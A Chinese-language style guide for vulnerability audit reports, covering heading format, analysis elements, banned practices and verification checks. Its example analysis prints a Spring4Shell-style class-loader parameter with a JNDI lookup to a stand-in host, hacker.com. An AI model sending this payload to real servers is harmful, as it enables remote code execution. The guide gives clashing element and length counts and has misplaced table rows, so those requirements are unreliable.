## 格式规范速查表

| 内容 | 标签 | 字数要求 | 必须包含 |
|------|------|---------|---------|
| **漏洞名称** | `#` (h1) | - | 单独一行，无严重程度标签 |
| **描述** | `###` (h3) | 100字左右 | 漏洞类型、成因、风险点 |

## 漏洞分析写作规范

**结构要求（200-300字）**：

| 序号 | 要素 | 说明 |
|------|------|------|
| 1 | 危险代码位置 | 指出具体代码和行号 |
| 2 | 当前状态分析 | 是否有受影响的接口、DTO字段情况 |
| 3 | 风险场景 | 如果未来新增某接口会如何 |
| 4 | 攻击路径 | 具体的攻击 URL 或恶意输入示例 |
| 5 | 攻击原理 | 解释攻击如何工作 |

**示例**：
```
在 XxxController 中存在危险的 @InitBinder 配置：`binder.setDisallowedFields(new String[]{})`（第X行）。
该配置显式禁用 Spring 的字段过滤机制，若存在参数绑定端点，攻击者可构造恶意参数触发安全风险。

当前该控制器仅有一个接口使用表单绑定，但 DTO 只含分页参数，无敏感字段。若后续新增参数绑定接口
（如 `@GetMapping("/export") public void export(Condition cond)`），攻击者可构造恶意 URL：
`?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{jndi:ldap://hacker.com/exp}`。
Spring 在绑定参数时，会以 DTO 对象为反射起点，通过 `getClass().getModule().getClassLoader()...` 
链式反射直达 Tomcat 核心组件，篡改配置注入恶意表达式。关键点：恶意参数并非绑定到业务字段，而是
利用 Java 对象继承 Object 的特性，将业务对象作为"跳板"直达底层。
```
| 4 | 对比分析 | 文字 | 与安全代码的差异 |
| 5 | 未使用的安全机制 | 文字 | 项目中存在但未启用 |
| 6 | 漏洞类型归纳 | 文字 | `CWE-XXX` |

## 禁止事项

| 禁止 | 正确做法 |
|------|---------|
| ❌ 在标题添加严重程度 | `# 任意文件上传漏洞` |
| ❌ 使用相对路径 | 使用完整绝对路径 |
| ❌ 模糊行号范围 | 精确到具体行号 |
| ❌ 编造代码片段 | 必须来自实际 Read 输出 |
| ❌ 猜测 CVE 编号 | 必须联网核实 |

## 报告检查清单

### 开头部分
- [ ] 漏洞列表已列出所有漏洞名称
- [ ] 审计进度显示 L1-L3 三个层级

### 每个漏洞
- [ ] 漏洞名称使用 h1 标签，无严重程度标签
- [ ] 描述 100 字左右，说明漏洞类型、成因、风险
- [ ] 代码位置使用完整绝对路径
- [ ] 问题代码展示包含上下文
- [ ] 漏洞分析 300 字以上，包含 6 个要素
- [ ] 修复建议提供可执行代码示例

### ⚠️ 提交前验证（必做）

**当涉及"覆盖"、"绕过"、"失效"等描述时**：

| 描述 | 必须验证 | 验证命令 |
|------|---------|---------|
| "覆盖了X" | 类是否继承了X？ | `Select-String "class.*extends X"` |
| "绕过了Y" | Y真的存在吗？ | `Select-String "Y的代码"` |
| "失效/禁用Z" | Z的生效条件是什么？ | 分析配置逻辑 |

**教训案例（2026-04-01）**：
> 写"批量分配防护被覆盖"，但类根本没继承父类。
> **正确做法**：先验证继承关系，再判断是"覆盖"还是"缺失"。
